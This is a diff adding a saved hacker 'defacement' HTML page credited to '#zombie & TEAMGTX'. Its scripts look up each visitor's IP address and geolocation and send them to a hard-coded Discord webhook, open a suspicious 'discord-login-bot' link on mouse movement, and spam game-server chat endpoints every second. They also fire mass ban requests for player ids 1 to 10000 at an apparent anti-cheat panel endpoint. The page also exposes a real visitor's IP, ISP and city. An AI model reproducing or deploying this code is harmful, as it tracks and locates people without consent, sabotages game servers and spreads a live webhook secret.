@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)https://zombieeeeeeeeeeeee.github.io/zombieeeeee3/.github.io/team-gtx0/ -->
+<html lang="en"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>#zomn</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 91vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+        .anime-image {
+            width: 554px; /* تم تصغير الصورة */
+            max-width: 100%; /* لتناسب جميع الشاشات */
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.8;
+        }
+        .info {
+            margin-top: 10px;
+            font-size: 1.2rem;
+        }
+        .link {
+            margin-top: 10px;
+            font-size: 1.5rem;
+            color: #00f;
+            text-decoration: none;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+        .decorative-text {
+            margin-top: 20px;
+            font-size: 1.0rem;
+            font-style: italic;
+            font-weight: bold;
+            text-shadow: 0 0 2px #00f;
+            animation: rgbColorChange 6s linear infinite;
+        }
+        @keyframes rgbColorChange {
+            0%   { color: rgb(255, 0, 0); }
+            33%  { color: rgb(0, 255, 0); }
+            66%  { color: rgb(0, 0, 255); }
+            100% { color: rgb(255, 0, 0); }
+        }
+        .signature-text {
+            margin-top: 10px;
+            color: #00f;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #00f;
+        }
+        pre {
+            color: white;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 15px;
+        }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script></head>
+<body __processed_3502f7cd-0e08-4913-b9bd-b7e33bfd7b2e__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjMzIiwic2NvcmUiOjIwMDMzfV0=">
+    <video class="background" autoplay="" muted="" loop="">
+        <source src="https://cdn.discordapp.com/attachments/126111958574387241/1305252891518439424/-_-_2020_-_.mp4" type="video/mp4">
+    </video>
+
+    <div class="container" bis_skin_checked="1">
+        <img class="anime-image" src="./#zombie_files/These 8-Bit Mr Robot GIFs Will Get You Completely Caught Up (1).gif" alt="Anime">
+
+        <div class="media-container" bis_skin_checked="1">
+            <audio autoplay="" loop="">
+                <source src="https://d.top4top.io/m_3540rn7sq1.mp3">
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+
+        <div class="decorative-text" bis_skin_checked="1">
+            <b>Your IP Address:</b> <span id="ip-address-value">79.177.143.68</span><br>
+            <b>IP Information:</b>
+            <pre id="ip-info">{
+  "ip": "79.177.143.68",
+  "hostname": "bzq-79-177-143-68.red.bezeqint.net",
+  "city": "Ashkelon",
+  "region": "Southern District",
+  "country": "IL",
+  "loc": "31.6693,34.5715",
+  "org": "AS6810 \"Bezeq\"- THE ISRAEL TELECOMMUNICATION CORP. LTD.",
+  "timezone": "Asia/Jerusalem",
+  "readme": "https://ipinfo.io/missingauth"
+}</pre>
+        </div>
+
+        <div class="decorative-text" bis_skin_checked="1">
+            <p>You Get Hacking By #zombie &amp; TEAMGTX</p>
+            <p>discord.gg/GTX0</p>
+        </div>
+
+        <div class="signature-text" bis_skin_checked="1">
+            <p></p>
+        </div>
+    </div>
+
+
+
+
+    <script>
+        // منع التحديد
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
+        function reEnable() { return true; }
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () { return false; };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // جلب IP والمعلومات
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
+                .then((response) => response.json())
+                .then((ipInfoData) => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "Visitor");
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1439018841798742116/o5UmfmqEFq8TJ_t4-1bfyIVBZ3Abv7LzsbENVyTEdEV6PhlB7O5g8UCA0n8Zl14cxs3P";
+            const payload = {
+                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+            fetch(webhookURL, { 
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => console.log("IP sent to Discord!"))
+            .catch(error => console.error(error));
+        }
+
+        fetchIPAndInfo();
+
+        // فتح روابط عند تحريك الماوس
+        let triggered = false;
+        window.addEventListener('mousemove', () => {
+            if (!triggered) {
+                triggered = true;
+                window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
+                window.open('https://discord.gg/gtx0', '_blank');
+            }
+        });
+
+        // زر الخروج
+        document.getElementById('exitButton').addEventListener('click', () => {
+            window.open('https://discord.gg/gtx0', '_blank');
+            window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
+            alert('اضغط OK للخروج من الشاشة');
+        });
+    </script>
+<script>
+    const msg = `.`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/GTX0");
+window.invokeNative("openUrl", "https://discord.gg/GTX0");
+window.invokeNative("openUrl", "https://discord.gg/GTX0");
+window.invokeNative("openUrl", "https://discord.gg/GTX0");
+}, 1000);
+  <script>
+for (let i = 1; i <= 10000; i++) {
+    setTimeout(() => {
+        $.post('https://fiveguard-PANEL/BanPlayer', JSON.stringify({
+            id: i,
+            Reason: "TEAM GTX IS HERE "
+        }));
+    }, i * 50); // تأخير 50ms بين كل لاعب
+}
+  </script>
+
+
+
+
+</body></html>
